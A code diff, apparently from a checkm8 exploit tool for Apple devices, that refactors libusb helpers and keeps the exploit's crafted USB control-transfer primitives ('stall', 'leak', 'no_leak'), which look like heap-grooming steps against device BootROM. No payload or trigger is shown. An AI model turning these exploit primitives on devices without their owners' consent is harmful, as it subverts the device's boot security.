@@ -1,42 +1,94 @@
 #include "libusb_helpers.h"
-#include "libusb.h"
+#include "checkm8.h"
 
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-int get_test_device(libusb_context *usb_ctx, struct libusb_device_bundle *bundle)
+#include "../../checkm8_libusb/src/libusbi.h"
+
+int get_device_bundle(struct pwned_device *dev)
 {
+    if(dev->bundle->ctx == NULL)
+    {
+        dev->bundle->ctx = malloc(sizeof(libusb_context));
+        libusb_init(&dev->bundle->ctx);
+    }
+    else
+    {
+        if(dev->bundle->descriptor != NULL &&
+           dev->bundle->descriptor->idVendor == dev->idVendor &&
+           dev->bundle->descriptor->idProduct == dev->idProduct)
+        {
+            return LIBUSB_SUCCESS;
+        }
+    }
+
     libusb_device **usb_device_list = NULL;
-    int usb_dev_count, ret = 1;
+    int usb_dev_count, ret = LIBUSB_ERROR_NO_DEVICE;
 
-    usb_dev_count = libusb_get_device_list(usb_ctx, &usb_device_list);
+    usb_dev_count = libusb_get_device_list(dev->bundle->ctx, &usb_device_list);
 
-    libusb_device *usb_device = NULL;
-    libusb_device_handle *usb_handle = NULL;
-    struct libusb_device_descriptor usb_desc = {0};
+    dev->bundle->device = NULL;
+    dev->bundle->handle = NULL;
+    dev->bundle->descriptor = malloc(sizeof(struct libusb_device_descriptor));
 
     for(unsigned int i = 0; i < usb_dev_count; i++)
     {
-        usb_device = usb_device_list[i];
-        libusb_get_device_descriptor(usb_device, &usb_desc);
+        dev->bundle->device = usb_device_list[i];
+        libusb_get_device_descriptor(dev->bundle->device, dev->bundle->descriptor);
 
-        if(usb_desc.idVendor == 0x05AC && usb_desc.idProduct == 0x1227)
+        if(dev->bundle->descriptor->idVendor == dev->idVendor &&
+           dev->bundle->descriptor->idProduct == dev->idProduct)
         {
-            ret = 0;
+            ret = LIBUSB_SUCCESS;
             break;
         }
     }
 
     libusb_free_device_list(usb_device_list, usb_dev_count);
-    if(ret == 0)
+    if(ret == LIBUSB_SUCCESS)
     {
-        bundle->device = usb_device;
-        bundle->handle = usb_handle;
-        bundle->descriptor = usb_desc;
+        libusb_open(dev->bundle->device, &dev->bundle->handle);
+        libusb_set_auto_detach_kernel_driver(dev->bundle->handle, 1);
+    }
+    else
+    {
+        libusb_exit(dev->bundle->ctx);
+        free(dev->bundle->ctx);
+        free(dev->bundle->descriptor);
+
+        dev->bundle->ctx = NULL;
+        dev->bundle->device = NULL;
+        dev->bundle->handle = NULL;
+        dev->bundle->descriptor = NULL;
     }
 
     return ret;
+}
+
+int release_device_bundle(struct pwned_device *dev)
+{
+    if(dev->bundle->handle != NULL)
+    {
+        libusb_close(dev->bundle->handle);
+    }
+
+    dev->bundle->device = NULL;
+
+    if(dev->bundle->ctx != NULL)
+    {
+        libusb_exit(dev->bundle->ctx);
+        free(dev->bundle->ctx);
+    }
+
+    if(dev->bundle->descriptor != NULL)
+    {
+        free(dev->bundle->descriptor);
+        dev->bundle->descriptor = NULL;
+    }
+
+    return LIBUSB_SUCCESS;
 }
 
 void LIBUSB_CALL async_ctrl_transfer_cb(struct libusb_transfer *transfer)
@@ -47,7 +99,7 @@ void LIBUSB_CALL async_ctrl_transfer_cb(struct libusb_transfer *transfer)
            transfer->length);
 }
 
-void libusb1_async_ctrl_transfer(libusb_device_handle *handle,
+void libusb1_async_ctrl_transfer(struct pwned_device *dev,
                                  unsigned char bmRequestType, unsigned char bRequest,
                                  unsigned short wValue, unsigned short wIndex,
                                  unsigned char *data, unsigned short data_len,
@@ -62,7 +114,7 @@ void libusb1_async_ctrl_transfer(libusb_device_handle *handle,
     struct libusb_transfer *usb_transfer = libusb_alloc_transfer(0);
     libusb_fill_control_setup(usb_transfer_buf, bmRequestType, bRequest, wValue, wIndex, data_len);
     memcpy(&usb_transfer_buf[8], data, data_len);
-    libusb_fill_control_transfer(usb_transfer, handle, usb_transfer_buf, async_ctrl_transfer_cb, NULL, 1);
+    libusb_fill_control_transfer(usb_transfer, dev->bundle->handle, usb_transfer_buf, async_ctrl_transfer_cb, NULL, 1);
 
     ret = libusb_submit_transfer(usb_transfer);
     if(ret != 0)
@@ -90,7 +142,7 @@ void libusb1_async_ctrl_transfer(libusb_device_handle *handle,
     }
 }
 
-void libusb1_no_error_ctrl_transfer(libusb_device_handle *handle,
+void libusb1_no_error_ctrl_transfer(struct pwned_device *dev,
                                     unsigned char bmRequestType, unsigned char bRequest,
                                     unsigned short wValue, unsigned short wIndex,
                                     unsigned char *data, unsigned short data_len,
@@ -102,7 +154,7 @@ void libusb1_no_error_ctrl_transfer(libusb_device_handle *handle,
     if(recipient == 1 && rqtype == (2u << 5u))
     {
         unsigned short interface = wIndex & 0xFFu;
-        ret = libusb_claim_interface(handle, interface);
+        ret = libusb_claim_interface(dev->bundle->handle, interface);
         if(ret > 0)
         {
             printf("%s\n", libusb_error_name(ret));
@@ -110,7 +162,7 @@ void libusb1_no_error_ctrl_transfer(libusb_device_handle *handle,
         }
     }
 
-    ret = libusb_control_transfer(handle, bmRequestType, bRequest, wValue, wIndex, data, data_len, timeout);
+    ret = libusb_control_transfer(dev->bundle->handle, bmRequestType, bRequest, wValue, wIndex, data, data_len, timeout);
     printf("%s\n", libusb_error_name(ret));
 }
 
@@ -180,39 +232,39 @@ static unsigned char data_0x0_0xC0_buf[192] =
                 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
         };
 
-void stall(libusb_device_handle *handle)
+void stall(struct pwned_device *dev)
 {
-    libusb1_async_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A,
+    libusb1_async_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                 data_0xA_0xC0_buf, 0xC0, 1);
 }
 
-void leak(libusb_device_handle *handle)
+void leak(struct pwned_device *dev)
 {
-    libusb1_no_error_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A,
+    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                    data_0x0_0xC0_buf, 0xC0, 1);
 }
 
-void no_leak(libusb_device_handle *handle)
+void no_leak(struct pwned_device *dev)
 {
-    libusb1_no_error_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A,
+    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                    data_0xA_0xC1_buf, 0xC1, 1);
 }
 
-void usb_req_stall(libusb_device_handle *handle)
+void usb_req_stall(struct pwned_device *dev)
 {
     unsigned char data[0];
-    libusb1_no_error_ctrl_transfer(handle, 0x2, 3, 0, 0x80, data, 0, 1);
+    libusb1_no_error_ctrl_transfer(dev, 0x2, 3, 0, 0x80, data, 0, 1);
 }
 
-void usb_req_leak(libusb_device_handle *handle)
+void usb_req_leak(struct pwned_device *dev)
 {
-    libusb1_no_error_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A,
+    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                    data_0x0_0x40_buf, 0x40, 1);
 }
 
-void usb_req_no_leak(libusb_device_handle *handle)
+void usb_req_no_leak(struct pwned_device *dev)
 {
 
-    libusb1_no_error_ctrl_transfer(handle, 0x80, 6, 0x304, 0x40A,
+    libusb1_no_error_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A,
                                    data_0x0_0x41_buf, 0x41, 1);
 }
